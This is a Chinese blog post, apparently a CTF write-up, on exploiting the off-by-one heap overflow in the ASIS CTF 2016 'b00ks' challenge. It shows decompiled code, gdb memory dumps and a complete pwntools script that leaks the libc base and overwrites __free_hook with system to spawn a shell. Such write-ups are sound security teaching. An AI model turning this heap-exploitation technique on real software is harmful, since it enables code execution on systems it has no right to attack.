<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>堆溢出off-by-one(asis-ctf-2016 pwn 之 b00ks) - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="堆溢出off-by-one(asis-ctf-2016 pwn 之 b00ks)" />
<meta property="og:description" content="这些天积累也知道了一些关于glibc内存的分配策略。 说pwn 是在内存里捉迷藏其实到这里才真正接触大片的内存。精确控制就能保证精确修改数据。 需要的一个很重要的能力就是跟内存的能力。 这里调试exp用gdb.attach(p)来下断点，弹出调试界面。跟踪内存。 用gdb的x命令/xg参数来查看内存以十六进制8字节显示。 这个程序开启了PIE跟踪不太容易，不过可以用find命令查找输入的字符串来定位地址
查看保护：
liu@liu-F117-F:~/文档/堆溢出学习/off-by-one$ checksec b00ks [*] &#39;/home/liu/\xe6\x96\x87\xe6\xa1\xa3/\xe5\xa0\x86\xe6\xba\xa2\xe5\x87\xba\xe5\xad\xa6\xe4\xb9\xa0/off-by-one/b00ks&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled liu@liu-F117-F:~/文档/堆溢出学习/off-by-one$ 保护只关闭了stack
是一个图书管理系统。 主要内容就这么多
__int64 __fastcall main(__int64 a1, char **a2, char **a3) { struct _IO_FILE *v3; // rdi __int64 savedregs; // [rsp&#43;20h] [rbp&#43;0h] setvbuf(stdout, 0LL, 2, 0LL); v3 = stdin; setvbuf(stdin, 0LL, 1, 0LL); sub_A77(v3, 0LL); sub_B6D(v3); while ( (unsigned int)sub_A89() !" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/ffd0a44896ddc137f19839fddf5ef6f2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-08-01T10:24:42+08:00" />
<meta property="article:modified_time" content="2018-08-01T10:24:42+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">堆溢出off-by-one(asis-ctf-2016 pwn 之 b00ks)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-github-gist">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>这些天积累也知道了一些关于glibc内存的分配策略。 <br> 说pwn 是在内存里捉迷藏其实到这里才真正接触大片的内存。精确控制就能保证精确修改数据。 <br> 需要的一个很重要的能力就是跟内存的能力。 <br> 这里调试exp用<code>gdb.attach(p)</code>来下断点，弹出调试界面。跟踪内存。 <br> 用gdb的x命令/xg参数来查看内存以十六进制8字节显示。 <br> 这个程序开启了PIE跟踪不太容易，不过可以用find命令查找输入的字符串来定位地址</p> 
<p>查看保护：</p> 
<pre class="prettyprint"><code class=" hljs tex">liu@liu-F117-F:<span class="hljs-special">~</span>/文档/堆溢出学习/off-by-one<span class="hljs-formula">$ checksec b00ks
<span class="hljs-special">[</span>*<span class="hljs-special">]</span> '/home/liu/<span class="hljs-command">\xe</span>6<span class="hljs-command">\x</span>96<span class="hljs-command">\x</span>87<span class="hljs-command">\xe</span>6<span class="hljs-command">\xa</span>1<span class="hljs-command">\xa</span>3/<span class="hljs-command">\xe</span>5<span class="hljs-command">\xa</span>0<span class="hljs-command">\x</span>86<span class="hljs-command">\xe</span>6<span class="hljs-command">\xba</span><span class="hljs-command">\xa</span>2<span class="hljs-command">\xe</span>5<span class="hljs-command">\x</span>87<span class="hljs-command">\xba</span><span class="hljs-command">\xe</span>5<span class="hljs-command">\xad</span><span class="hljs-command">\xa</span>6<span class="hljs-command">\xe</span>4<span class="hljs-command">\xb</span>9<span class="hljs-command">\xa</span>0/off-by-one/b00ks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
liu@liu-F117-F:<span class="hljs-special">~</span>/文档/堆溢出学习/off-by-one$</span> </code></pre> 
<p>保护只关闭了stack</p> 
<p>是一个图书管理系统。 <br> 主要内容就这么多</p> 
<pre class="prettyprint"><code class=" hljs cpp">__int64 __fastcall main(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)
{
  <span class="hljs-keyword">struct</span> _IO_FILE *v3; <span class="hljs-comment">// rdi</span>
  __int64 savedregs; <span class="hljs-comment">// [rsp+20h] [rbp+0h]</span>

  setvbuf(stdout, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);
  v3 = stdin;
  setvbuf(stdin, <span class="hljs-number">0L</span>L, <span class="hljs-number">1</span>, <span class="hljs-number">0L</span>L);
  sub_A77(v3, <span class="hljs-number">0L</span>L);
  sub_B6D(v3);
  <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)sub_A89() != <span class="hljs-number">6</span> )
  {
    <span class="hljs-keyword">switch</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;savedregs )
    {
      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:
        sub_F55();
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:
        sub_BBD(v3);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:
        sub_E17(v3);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:
        sub_D1F(v3);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:
        sub_B6D(v3);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        v3 = (<span class="hljs-keyword">struct</span> _IO_FILE *)<span class="hljs-string">"Wrong option"</span>;
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong option"</span>);
        <span class="hljs-keyword">break</span>;
    }
  }
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks to use our library software"</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
}</code></pre> 
<hr> 
<p><strong>0x01找出来这个程序中图书结构体的存储方式</strong></p> 
<pre class="prettyprint"><code class=" hljs cpp">             <span class="hljs-keyword">else</span>
              {
                v4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);
                <span class="hljs-keyword">if</span> ( v4 )
                {
                  *((_DWORD *)v4 + <span class="hljs-number">6</span>) = v2;
                  *((_QWORD *)off_202010 + v3) = v4;
                  *((_QWORD *)v4 + <span class="hljs-number">2</span>) = v6;
                  *((_QWORD *)v4 + <span class="hljs-number">1</span>) = ptr;
                  *(_DWORD *)v4 = ++unk_202024;
                  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
                }</code></pre> 
<p>v2是输入的discroption的长度，v6指向discription。ptr指向name，unk_202024是一个ID每一本书都会有一个ID. <br> 测试如下 <br> 测试数据：</p> 
<pre class="prettyprint"><code class=" hljs mathematica"><span class="hljs-keyword">Enter</span> author name: AAAAAAAABC

<span class="hljs-number">1.</span> Create a book
<span class="hljs-number">2.</span> <span class="hljs-keyword">Delete</span> a book
<span class="hljs-number">3.</span> Edit a book
<span class="hljs-number">4.</span> <span class="hljs-keyword">Print</span> book detail
<span class="hljs-number">5.</span> Change current author name
<span class="hljs-number">6.</span> <span class="hljs-keyword">Exit</span>
&gt; <span class="hljs-number">1</span> 

<span class="hljs-keyword">Enter</span> book name size: <span class="hljs-number">12</span>
<span class="hljs-keyword">Enter</span> book name (<span class="hljs-keyword">Max</span> <span class="hljs-number">32</span> chars): liu123

<span class="hljs-keyword">Enter</span> book description size: <span class="hljs-number">20</span>
<span class="hljs-keyword">Enter</span> book description: i am liu111111</code></pre> 
<p>ctl+c断下来</p> 
<pre class="prettyprint"><code class=" hljs lasso">gdb<span class="hljs-attribute">-peda</span>$ find AAAABC
Searching for <span class="hljs-string">'AAAABC'</span> <span class="hljs-keyword">in</span>: <span class="hljs-literal">None</span> ranges
Found <span class="hljs-number">1</span> results, display <span class="hljs-keyword">max</span> <span class="hljs-number">1</span> items:
b00ks : <span class="hljs-number">0x555555756044</span> <span class="hljs-subst">--&gt;</span> <span class="hljs-number">0x434241414141</span> (<span class="hljs-string">'AAAABC'</span>)
gdb<span class="hljs-attribute">-peda</span>$ x /<span class="hljs-number">10</span>xg <span class="hljs-number">0x555555756040</span>
<span class="hljs-number">0x555555756040</span>: <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x0000000000004342</span>
<span class="hljs-number">0x555555756050</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-number">0x555555756060</span>: <span class="hljs-number">0x00005555557576b0</span>  <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-number">0x555555756070</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-number">0x555555756080</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span></code></pre> 
<p>这里存放的是作者＋第一本书的结构</p> 
<pre class="prettyprint"><code class=" hljs ruby">gdb-peda<span class="hljs-variable">$ </span>x /<span class="hljs-number">10</span>xg <span class="hljs-number">0x00005555557576b0</span>
<span class="hljs-number">0x5555557576b0</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000555555757670</span>
<span class="hljs-number">0x5555557576c0</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000555555757690</span>  <span class="hljs-number">0x0000000000000014</span>
<span class="hljs-number">0x5555557576d0</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020931</span></code></pre> 
<p>这里是id,name地址和discription的地址，size。 <br> 0x0000000000020931这个书是top chunk可以认为是一个标识，标识着堆的顶。 <br> 再看Create函数，里面是三个malloc函数先malloc的是name 然后是discription最后是v4这个结构。 <br> 这里有一点疑问，为什么存的时候是<code>*((_DWORD *)v4 + 6) = v2;</code>而真正的内存里面却是把0x0000000000000014放到了+３处。 <br> 知道的欢迎留言，非常感谢。</p> 
<hr> 
<p><strong>0x02找出漏洞</strong> <br> 题目就是off-by-one就是一个字节的溢出。 <br> 下面是自定义的一个read函数</p> 
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-keyword">signed</span> __int64 __fastcall sub_9F5(_BYTE *a1, <span class="hljs-keyword">int</span> a2)
{
  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>
  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>

  <span class="hljs-keyword">if</span> ( a2 &lt;= <span class="hljs-number">0</span> )
    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
  buf = a1;
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )
  {
    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>LL) != <span class="hljs-number">1</span> )
      <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;
    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-number">10</span> )
      <span class="hljs-keyword">break</span>;
    ++buf;
    <span class="hljs-keyword">if</span> ( i == a2 )
      <span class="hljs-keyword">break</span>;
  }
  *buf = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
}</code></pre> 
<p>在输入作者的时候存在漏洞。 <br> 如果输入的数据有32个字符程序会把00添加到第33个位置上。</p> 
<hr> 
<p><strong>0x03利用漏洞分析</strong> <br> 利用漏洞之前这里讲一个函数，__free_hook函数。在调用free之前如果__free_hook函数不为NULL会先调用__free_hook函数在内存中前面紧挨的是它的参数这个函数本身是一个地址。更改这个地址指向的值可以实现劫持程序执行流。</p> 
<p>这里用到了2个指针要求想要正确调用这个函数至少需要1.自由修改一个地址。2.前面修改的内容处写入为指针那么这个指针指向的内容也能修改。</p> 
<p>上述修改过程需要满足找到一个地址，这个地址有2重或者更多重含义例如：这个地址将会是b00k1中的discrip部分同时也是指向了第二个chunk的name.</p> 
<p>下面的漏洞利用将达到这个目的。</p> 
<hr> 
<p><strong>0x04获取libc地址</strong> <br> libc的加载地址和用mmap申请的空间的地址有关，当malloc申请的空间比较小时用brk来分配，当申请空间比较大时用mmap分配这里需要做的是申请一个大的空间。</p> 
<p>填充进32个作者字符之后会使第33位设置为00在调用Create函数的时候会把00覆盖掉，可以实现泄露第一个b00k的地址。</p> 
<pre class="prettyprint"><code class=" hljs perl">p.recvuntil(<span class="hljs-string">"Enter author name: "</span>)
p.sendline(<span class="hljs-string">"A"</span><span class="hljs-variable">*31</span>+<span class="hljs-string">"B"</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Create(<span class="hljs-string">"130"</span>,<span class="hljs-string">"jion"</span>,<span class="hljs-string">"32"</span>,<span class="hljs-string">"i am join"</span>) <span class="hljs-comment">#######set fake b00k_addr</span>
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Print()
<span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">"AB"</span>)
first_b00k_addr=u64(p.<span class="hljs-keyword">recv</span>(<span class="hljs-number">6</span>)+<span class="hljs-string">'\00'</span>+<span class="hljs-string">'\00'</span>)
gdb.attach(p)
<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(first_b00k_addr)</code></pre> 
<p>看这时候的内存</p> 
<pre class="prettyprint"><code class=" hljs http"><span class="hljs-attribute">0x56146d2ad050</span>: <span class="hljs-string">0x4141414141414141  0x4241414141414141</span>
<span class="hljs-attribute">0x56146d2ad060</span>: <span class="hljs-string">0x000056146f25e330  0x0000000000000000</span>
<span class="hljs-attribute">0x56146d2ad070</span>: <span class="hljs-string">0x0000000000000000  0x0000000000000000</span>
<span class="hljs-attribute">0x56146d2ad080</span>: <span class="hljs-string">0x0000000000000000  0x0000000000000000</span>
<span class="hljs-attribute">0x56146d2ad090</span>: <span class="hljs-string">0x0000000000000000  0x0000000000000000</span></code></pre> 
<p>00被覆盖掉了。 <br> 接下来是设计一个伪造的b00k1这个伪造的book1有2层含义1.是b00k1的discription部分（本身可以修改）。2.指向第二个b00k的name字段。 <br> 程序提供了修改作者操作，调用修改作者可以修改第一个b00k的最后一个字节为00.</p> 
<pre class="prettyprint"><code class=" hljs perl">hange(<span class="hljs-string">"A"</span><span class="hljs-variable">*30</span>+<span class="hljs-string">'B'</span>+<span class="hljs-string">'C'</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)</code></pre> 
<p>first_b00k的地址最后一个字节已被修改为00</p> 
<pre class="prettyprint"><code class=" hljs ruby">gdb-peda<span class="hljs-variable">$ </span>x /<span class="hljs-number">10</span>xg <span class="hljs-number">0x55dbba2e8050</span>
<span class="hljs-number">0x55dbba2e8050</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x4342414141414141</span>
<span class="hljs-number">0x55dbba2e8060</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x000055dbbb5e1300</span>  <span class="hljs-number">0x000055dbbb5e1360</span>
<span class="hljs-number">0x55dbba2e8070</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-number">0x55dbba2e8080</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>
<span class="hljs-number">0x55dbba2e8090</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span></code></pre> 
<p>设置first_b00k_discription的chunk可以控制最后以字节为00处刚好为first_b00k指针指向的位置。伪造discription为fake b00k</p> 
<pre class="prettyprint"><code class=" hljs perl">p.recvuntil(<span class="hljs-string">"Enter author name: "</span>)
p.sendline(<span class="hljs-string">"A"</span><span class="hljs-variable">*31</span>+<span class="hljs-string">"B"</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Create(<span class="hljs-string">"130"</span>,<span class="hljs-string">"jion"</span>,<span class="hljs-string">"32"</span>,<span class="hljs-string">"i am join"</span>) <span class="hljs-comment">#######set fake b00k_addr</span>
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Print()
<span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">"AB"</span>)
first_b00k_addr=u64(p.<span class="hljs-keyword">recv</span>(<span class="hljs-number">6</span>)+<span class="hljs-string">'\00'</span>+<span class="hljs-string">'\00'</span>)
<span class="hljs-comment">#gdb.attach(p)</span>
<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(first_b00k_addr)</code></pre> 
<p>伪造first_b000k的discription项为first_b00k，让伪first_b00k的discription指向second_b00k的name。</p> 
<pre class="prettyprint"><code class=" hljs ruby">gdb-peda<span class="hljs-variable">$ </span>x /<span class="hljs-number">100</span>xg <span class="hljs-number">0x0000564315697300</span>
<span class="hljs-number">0x564315697300</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000564315697368</span>
<span class="hljs-number">0x564315697310</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000564315697368</span>  <span class="hljs-number">0x000000000000ffff</span>
<span class="hljs-number">0x564315697320</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000031</span>
<span class="hljs-number">0x564315697330</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000564315697270</span>
<span class="hljs-number">0x564315697340</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000564315697300</span>  <span class="hljs-number">0x0000000000000020</span>
<span class="hljs-number">0x564315697350</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000031</span>
<span class="hljs-number">0x564315697360</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000002</span>  <span class="hljs-number">0x00007fef169dc010</span>
<span class="hljs-number">0x564315697370</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x00007fef169ab010</span>  <span class="hljs-number">0x0000000000030d40</span>
<span class="hljs-number">0x564315697380</span><span class="hljs-symbol">:</span> <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x000000000001fc81</span></code></pre> 
<p>输出first_b00k的discription即为second_b00k_name指针实现泄露。 <br> 顺序： <br> １．设置作者为32字节 <br> ２．设置first_b00k的内容使地址最后以字节为00的地址处刚好指向first_b00k的discription <br> ３．输出接收到first_b00k的地址。 <br> ４．更改first_b00k_discription为伪first_b00k <br> ５．设置second_b00k的内容特别大，使malloc用mmap来分配内存 <br> ６．用32字节更改author使first_b00k指向fake b00k <br> ７．输出first_b00k的discription实现泄露。</p> 
<pre class="prettyprint"><code class=" hljs coffeescript">liu<span class="hljs-property">@liu</span>-F117-<span class="hljs-attribute">F</span>:~$ sudo cat /proc/<span class="hljs-number">32296</span>/maps
[sudo] liu 的密码： 
<span class="hljs-number">5643149e6000</span>-<span class="hljs-number">5643149e8000</span> r-xp <span class="hljs-number">00000000</span> <span class="hljs-attribute">fd</span>:<span class="hljs-number">00</span> <span class="hljs-number">13109433</span>                   /home<span class="hljs-regexp">/liu/</span>文档/堆溢出学习/<span class="hljs-literal">off</span>-<span class="hljs-keyword">by</span>-one/b00ks
<span class="hljs-number">564314</span>be7000-<span class="hljs-number">564314</span>be8000 r--p <span class="hljs-number">00001000</span> <span class="hljs-attribute">fd</span>:<span class="hljs-number">00</span> <span class="hljs-number">13109433</span>                   /home<span class="hljs-regexp">/liu/</span>文档/堆溢出学习/<span class="hljs-literal">off</span>-<span class="hljs-keyword">by</span>-one/b00ks
<span class="hljs-number">564314</span>be8000-<span class="hljs-number">564314</span>be9000 rw-p <span class="hljs-number">00002000</span> <span class="hljs-attribute">fd</span>:<span class="hljs-number">00</span> <span class="hljs-number">13109433</span>                   /home<span class="hljs-regexp">/liu/</span>文档/堆溢出学习/<span class="hljs-literal">off</span>-<span class="hljs-keyword">by</span>-one/b00ks
<span class="hljs-number">564315696000</span>-<span class="hljs-number">5643156</span>b7000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [heap]
<span class="hljs-number">7</span>fef1641a000-<span class="hljs-number">7</span>fef16601000 r-xp <span class="hljs-number">00000000</span> <span class="hljs-attribute">fd</span>:<span class="hljs-number">00</span> <span class="hljs-number">10490465</span>                   /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.27</span>.so
<span class="hljs-number">7</span>fef16601000-<span class="hljs-number">7</span>fef16801000 ---p <span class="hljs-number">001e7000</span> <span class="hljs-attribute">fd</span>:<span class="hljs-number">00</span> <span class="hljs-number">10490465</span>                   /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.27</span>.so</code></pre> 
<p>second_book_name-0x7fef1641a000=mmap申请地址的偏移。 <br> 偏移是固定的，通过这个公式计算出来偏移那么后面计算libc_base就是 <br> second_b00k_name-mmap申请地址偏移＝libc_base.</p> 
<hr> 
<p><strong>0x05 运行system(“/bin/sh”)</strong></p> 
<p>获取需要函数和参数的地址</p> 
<pre class="prettyprint"><code class=" hljs perl">libc=ELF(<span class="hljs-string">'libc.so.6'</span>)
system_addr = libc.symbols[<span class="hljs-string">'system'</span>] + libc_base_addr
<span class="hljs-keyword">print</span> <span class="hljs-string">"system_addr="</span>+<span class="hljs-keyword">hex</span>(system_addr)
free_hook=libc.symbols[<span class="hljs-string">"__free_hook"</span>]+libc_base_addr
binsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).<span class="hljs-keyword">next</span>() + libc_base_addr
<span class="hljs-comment">#gdb.attach(p)</span></code></pre> 
<p>因为开启了RELRO: Full RELRO保护不能复写got表 <br> 设置first_b00k_name内容为binsh，first_b00k_discription为free_hook,用second_b00k_discription向free_hook指向的内容写入system函数的地址。 <br> 当调用free函数的时候__free_hook函数不为NULL会优先调用__free_hook函数劫持free函数 <br> 执行system函数第一个free的参数可以设置为second_b00k_name。</p> 
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-comment">#context.log_level="debug"</span>
p=process(<span class="hljs-string">"./b00ks"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create</span><span class="hljs-params">(name_size,name,discription_size,discription)</span>:</span>
    p.sendline(<span class="hljs-string">'1'</span>)
    p.recvuntil(<span class="hljs-string">"size: "</span>)
    p.sendline(name_size)
    p.recvuntil(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>)
    p.sendline(name)
    p.recvuntil(<span class="hljs-string">"Enter book description size: "</span>)
    p.sendline(discription_size)
    p.recvuntil(<span class="hljs-string">"Enter book description: "</span>)
    p.sendline(discription)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Delete</span><span class="hljs-params">(ID)</span>:</span>
    p.sendline(<span class="hljs-string">"2"</span>)
    p.recvuntil(<span class="hljs-string">"Enter the book id you want to delete: "</span>)
    p.sendline(ID)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Edit</span><span class="hljs-params">(ID,discription)</span>:</span>
    p.sendline(<span class="hljs-string">"3"</span>)
    p.recvuntil(<span class="hljs-string">"Enter the book id you want to edit: "</span>)
    p.sendline(ID)
    p.recvuntil(<span class="hljs-string">"Enter new book description: "</span>)
    p.sendline(discription)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span>:</span>
    p.sendline(<span class="hljs-string">"4"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Change</span><span class="hljs-params">(author_name)</span>:</span>
    p.sendline(<span class="hljs-string">"5"</span>)
    p.recvuntil(<span class="hljs-string">"Enter author name: "</span>)
    p.sendline(author_name)


<span class="hljs-comment">#################################leak book1_addr###############################</span>
p.recvuntil(<span class="hljs-string">"Enter author name: "</span>)
p.sendline(<span class="hljs-string">"A"</span>*<span class="hljs-number">31</span>+<span class="hljs-string">"B"</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Create(<span class="hljs-string">"130"</span>,<span class="hljs-string">"jion"</span>,<span class="hljs-string">"32"</span>,<span class="hljs-string">"i am join"</span>) <span class="hljs-comment">#######set fake b00k_addr</span>
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Print()
<span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">"AB"</span>)
first_b00k_addr=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\00'</span>+<span class="hljs-string">'\00'</span>)
<span class="hljs-comment">#gdb.attach(p)</span>
<span class="hljs-keyword">print</span> hex(first_b00k_addr)
<span class="hljs-comment">####################################leak book1_addr end#######################</span>

<span class="hljs-comment">###################################set fake b00k in first b00k of discription###############</span>
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
payload=p64(<span class="hljs-number">0x01</span>)+p64(first_b00k_addr+<span class="hljs-number">0x38</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xffff</span>)
Edit(<span class="hljs-string">'1'</span>,payload)
<span class="hljs-comment">##############################make big memrry ####################################</span>
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
Create(<span class="hljs-string">'200000'</span>,<span class="hljs-string">'bill'</span>,<span class="hljs-string">'200000'</span>,<span class="hljs-string">"this is bill"</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
<span class="hljs-comment">############################set first b00k to fake b00k############################</span>

Change(<span class="hljs-string">"A"</span>*<span class="hljs-number">30</span>+<span class="hljs-string">'B'</span>+<span class="hljs-string">'C'</span>)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
gdb.attach(p)

<span class="hljs-comment">#############################get second b00k addr(get libc)#######################</span>
Print()
p.recvuntil(<span class="hljs-string">"Name: "</span>)
second_name_addr=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00'</span>+<span class="hljs-string">'\x00'</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">"second_name_addr="</span>+hex(second_name_addr)
<span class="hljs-comment">#gdb.attach(p)</span>
libc_base_addr=second_name_addr-<span class="hljs-number">0x5c2010</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"libc_base_addr="</span>+hex(libc_base_addr)
p.recvuntil(<span class="hljs-string">"&gt; "</span>)
<span class="hljs-comment">################################get libc addr end########################################</span>
libc=ELF(<span class="hljs-string">'libc.so.6'</span>)
system_addr = libc.symbols[<span class="hljs-string">'system'</span>] + libc_base_addr
<span class="hljs-keyword">print</span> <span class="hljs-string">"system_addr="</span>+hex(system_addr)
free_hook=libc.symbols[<span class="hljs-string">"__free_hook"</span>]+libc_base_addr
binsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).next() + libc_base_addr
<span class="hljs-comment">#gdb.attach(p)</span>
<span class="hljs-comment">####################################get shell#########################################</span>
payload = p64(binsh_addr) + p64(free_hook)  <span class="hljs-comment">#second_b00k_name=bin_sh    second_b00k_discription=free_hook</span>
Edit(<span class="hljs-string">'1'</span>,payload)
payload=p64(system_addr)   <span class="hljs-comment">#free_hook--&gt;system_addr</span>
Edit(<span class="hljs-string">'2'</span>,payload)
Delete(<span class="hljs-string">'2'</span>)
p.interactive()


</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b90a5436841c8c395794c8903cd1dfda/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">web前端开发（三）—JavaScript基础</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e18a6b3252623c8c6558c52f484a5cf3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Java-c3p0原生写法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
